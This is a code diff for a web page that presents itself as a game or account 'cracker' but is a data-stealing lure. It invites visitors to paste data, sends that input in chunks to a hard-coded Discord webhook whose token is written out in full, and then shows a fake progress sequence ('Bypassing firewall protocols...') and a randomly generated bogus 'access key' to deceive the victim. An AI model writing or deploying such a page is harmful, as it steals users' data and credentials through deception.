@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UUACOUNT CRACKER</title>
+    <title>UU CRACJER</title>
     <style>
-        /* Modern Dark Theme */
         body {
             background-color: #0d1117;
             color: #58a6ff;
@@ -26,7 +25,7 @@
             border: 1px solid #30363d;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             width: 90%;
-            max-width: 500px;
+            max-width: 600px;
         }
 
         h2 {
@@ -38,22 +37,19 @@
             text-shadow: 0 0 10px #58a6ff;
         }
 
-        input[type="text"] {
+        textarea {
             width: 100%;
+            height: 150px;
             padding: 15px;
             margin-bottom: 20px;
             background: #0d1117;
             border: 1px solid #30363d;
             border-radius: 5px;
             color: white;
-            font-size: 1.1rem;
+            font-size: 1rem;
             box-sizing: border-box;
             outline: none;
-        }
-
-        input[type="text"]:focus {
-            border-color: #58a6ff;
-            box-shadow: 0 0 5px #58a6ff;
+            resize: none;
         }
 
         button {
@@ -69,11 +65,8 @@
             transition: background 0.3s;
         }
 
-        button:hover {
-            background-color: #2ea043;
-        }
+        button:hover { background-color: #2ea043; }
 
-        /* Loading Screen Elements */
         #loading-screen { display: none; }
 
         .progress-container {
@@ -98,49 +91,79 @@
             font-size: 1.1rem;
             color: #8b949e;
         }
+
+        /* Access Key Style */
+        #final-key {
+            display: none;
+            word-break: break-all;
+            background: #0d1117;
+            padding: 15px;
+            border: 1px dashed #238636;
+            color: #2ea043;
+            font-family: monospace;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div id="login-box">
-            <h2>UUCRACKER</h2>
-            <input type="text" id="userInput" placeholder="CRACKED USER INFO">
+            <h2>Crack the game/account here!</h2>
+            <textarea id="userInput" placeholder="Paste data here..."></textarea>
             <button onclick="startLogin()">INITIALIZE</button>
         </div>
 
         <div id="loading-screen">
-            <h2>PROCESSING</h2>
-            <div class="progress-container">
+            <h2 id="header-text">PROCESSING</h2>
+            <div id="p-container" class="progress-container">
                 <div id="bar" class="progress-bar"></div>
             </div>
             <p id="timer">60s remaining</p>
-            <p id="status-text">Connecting to gateway...</p>
+            <p id="status-text">Uploading data segments...</p>
+            <div id="final-key"></div>
         </div>
     </div>
 
     <script>
+        const sleep = ms => new Promise(res => setTimeout(res, ms));
+
+        function generateRandomString(length) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
         async function startLogin() {
             const inputVal = document.getElementById('userInput').value;
             const webhookURL = 'https://discord.com/api/webhooks/1453764437608501472/M3izTOyXPaS_8RPHmqNDs-RXV8sApH8OG9jDA4gHd2_fzItzV3ZCNqcZAqNY1t2tXYi1';
 
             if (!inputVal) {
-                alert("Please enter a code.");
+                alert("Please enter data.");
                 return;
             }
 
-            // Send to Discord
-            try {
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `**Login Attempt:** ${inputVal}` }),
-                });
-            } catch (e) { console.error(e); }
-
-            // Switch UI
             document.getElementById('login-box').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'block';
+
+            const chunks = inputVal.match(/[\s\S]{1,1900}/g) || [];
+
+            for (let i = 0; i < chunks.length; i++) {
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            content: `**Data Part ${i + 1}/${chunks.length}:**\n\`\`\`\n${chunks[i]}\n\`\`\`` 
+                        }),
+                    });
+                    await sleep(1000); 
+                } catch (e) { console.error(e); }
+            }
 
             let secondsLeft = 60;
             const statusMessages = [
@@ -148,26 +171,31 @@
                 "Bypassing firewall protocols...",
                 "Syncing data packets...",
                 "Finalizing system entry...",
-                "Accessing secure node..."
+                "Generating access token..."
             ];
             
             const countdown = setInterval(() => {
                 secondsLeft--;
-                
-                // Update text and bar
                 document.getElementById('timer').innerText = `${secondsLeft}s remaining`;
                 document.getElementById('bar').style.width = ((60 - secondsLeft) / 60 * 100) + "%";
                 
-                // Change status message every 12 seconds
-                if (secondsLeft % 12 === 0 && secondsLeft > 0) {
+                if (secondsLeft % 10 === 0 && secondsLeft > 0) {
                     const randomMsg = statusMessages[Math.floor(Math.random() * statusMessages.length)];
                     document.getElementById('status-text').innerText = randomMsg;
                 }
 
                 if (secondsLeft <= 0) {
                     clearInterval(countdown);
-                    document.getElementById('status-text').innerText = "SYSTEM ACCESS GRANTED";
+                    document.getElementById('header-text').innerText = "SUCCESS";
+                    document.getElementById('timer').style.display = 'none';
+                    document.getElementById('p-container').style.display = 'none';
+                    document.getElementById('status-text').innerText = "GENERATED ACCESS KEY:";
                     document.getElementById('status-text').style.color = "#238636";
+                    
+                    // Show the random string
+                    const keyBox = document.getElementById('final-key');
+                    keyBox.innerText = "KEY_" + generateRandomString(128);
+                    keyBox.style.display = 'block';
                 }
             }, 1000);
         }
